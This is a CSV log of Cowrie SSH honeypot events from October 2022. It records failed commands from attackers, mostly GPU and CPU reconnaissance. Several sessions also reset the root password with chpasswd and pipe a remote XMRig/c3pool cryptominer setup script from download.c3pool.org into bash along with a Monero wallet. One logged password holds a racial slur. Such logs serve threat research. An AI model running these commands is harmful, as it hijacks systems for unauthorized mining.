eventid,username,input,size,compCS,width,outfile,protocol,duration,height,url,keyAlgs,ttylog,data,sensor,arch,session,shasum,message,langCS,timestamp,kexAlgs,encCS,password,version,dst_port,macCS,destfile,client_fingerprint,filename
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a2c123d07399,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:36.350725Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,56be8421183f,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:37.125304Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0e8123affefc,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:38.194542Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,14401d9718f8,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:39.146908Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,b24454f73d41,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:40.019546Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,451fae84046e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:40.561017Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f9bd7939f542,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:41.772425Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,305d5966a33d,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:42.443285Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,4f30f22b01de,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:43.178130Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,2de42425890d,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:44.163230Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,4a7e3ae18d5e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:44.729386Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,553b977e5be5,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:45.758366Z,,,,,,,,,
cowrie.command.failed,,echo root:tempoXMRprongtogSgg31337 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,9d2600af5110,,Command not found: echo root:tempoXMRprongtogSgg31337 | chpasswd | bash,,2022-10-01T06:01:46.536294Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,9d2600af5110,,Command not found: nvidia-smi,,2022-10-01T06:01:46.539043Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,9d2600af5110,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T06:01:46.552243Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,736a19321453,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:47.321748Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,18be53c7f6d2,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:48.217542Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,b31e0a643116,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:49.156627Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a7452e1ccbed,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:49.945588Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,cf8aaf8f4cd7,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:51.570603Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,07f9144bb224,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:52.594397Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,b7ee51a2aa3e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:53.392888Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,714ce54195f5,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T06:01:54.261156Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,714ce54195f5,,Command not found: nvidia-smi,,2022-10-01T06:01:54.263730Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,714ce54195f5,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T06:01:54.266149Z,,,,,,,,,
cowrie.command.failed,,/ip cloud print,,,,,,,,,,,,fet-cowrie,,713defb3ffd6,,Command not found: /ip cloud print,,2022-10-01T06:01:55.087130Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,93097d29bab5,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:56.181196Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,9d377783d4f9,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:57.418046Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,bf21af8a81db,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:01:59.203710Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c967c5a49f0a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:00.080974Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,97d3adac737a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:01.932047Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,cd0623e19c2c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:02.995147Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,afae8efc5f7c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:05.825488Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,84b3c6ec88ad,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:07.654923Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,91bebad22ef8,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:09.535634Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,55a50960ffd0,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:13.943412Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,273b57acdc1c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:15.024290Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,de6fb2733d66,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:18.561062Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,3bdc1886de75,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:19.461438Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,4b471efbd9c7,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:21.441369Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,1f308718b31f,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:24.800509Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a152c7f56607,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:27.722653Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,1ae1a59aed57,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:30.256361Z,,,,,,,,,
cowrie.command.failed,,echo root:tempoXMRprongtogSgg31337 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,3b9a80a3efb1,,Command not found: echo root:tempoXMRprongtogSgg31337 | chpasswd | bash,,2022-10-01T06:02:32.030779Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,3b9a80a3efb1,,Command not found: nvidia-smi,,2022-10-01T06:02:32.033755Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,3b9a80a3efb1,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T06:02:32.046853Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a87f9b88b792,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:32.892276Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,34fb603fe400,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:34.239183Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ebefcbbfc6ad,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:35.060315Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,bf0539a68786,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:36.237978Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,56f36c18600c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:37.348979Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,01148b2d87ad,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:38.180986Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,207b112a5317,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:38.953665Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,88a307a99c3f,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:39.755436Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,cc064c7c9c0f,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:40.806828Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,e2c5d2fa20e4,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:42.174937Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,88711809c82d,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:45.054683Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,25455b2f3049,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:50.380481Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,697106b9a8ba,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:54.548896Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,dd7ca6939896,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:55.499748Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,dc7728cc304a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:57.803941Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,76a0705051b9,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:58.861107Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,b7974d4bded9,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:02:59.660334Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,4cd602fecd08,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:00.722193Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,929238e1edf0,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:01.575355Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,116f285c58c3,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:02.103953Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f60a83c34e77,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:04.001549Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,5437c8b02bd0,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:04.537868Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,03893a78b79e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:05.390637Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,16efd887d2ea,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:06.209029Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,5267d8a09f58,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:07.214567Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,9198fa08efcc,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:08.793875Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,3bebcc63cc0e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:10.194231Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,9e690c59b867,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:11.123370Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,120b72b49dd0,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:11.667605Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,010829c9c7b2,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:12.207543Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,14c6def8d2a7,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:13.127949Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,64a98f0be6ea,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:13.939112Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,23ff8a41f579,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:14.479859Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,947c9f57e5c4,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:15.446835Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,889c2f2b1980,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:17.714315Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,6c5219bb0f7b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:18.630138Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a34f5e912775,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:19.428103Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a44f6bcf4b75,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:20.565771Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f43093bd49e4,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:21.167671Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,40b8815bb58b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:22.009139Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f50fb5587692,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:22.567339Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0a5d052a1d35,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:23.397863Z,,,,,,,,,
cowrie.command.failed,,echo root:tempoXMRprongtogSgg31337 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,36adde171636,,Command not found: echo root:tempoXMRprongtogSgg31337 | chpasswd | bash,,2022-10-01T06:03:24.248206Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,36adde171636,,Command not found: nvidia-smi,,2022-10-01T06:03:24.251335Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,36adde171636,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T06:03:24.263045Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f6b6f0b47eb2,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:24.807429Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ae7580725b4e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:26.079487Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,fc7661a8de88,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:26.899812Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,acdd14a8d4b1,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:27.452083Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d271ede07cd2,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:28.268614Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,aa79366f22fb,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:29.023788Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,815c2230834a,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T06:03:29.584270Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,edc27be6a0db,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:30.480997Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,61be3d59e289,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T06:03:31.777567Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,5ea3d24b97a4,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:32.513231Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,31479ed1ece1,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:33.285407Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c90de1acdd40,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:35.490683Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,44939287b5e5,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:36.136538Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,17fb9fe62381,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:37.071814Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,9e87f7e8cab4,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:39.318133Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,5d9f989f605a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:40.763830Z,,,,,,,,,
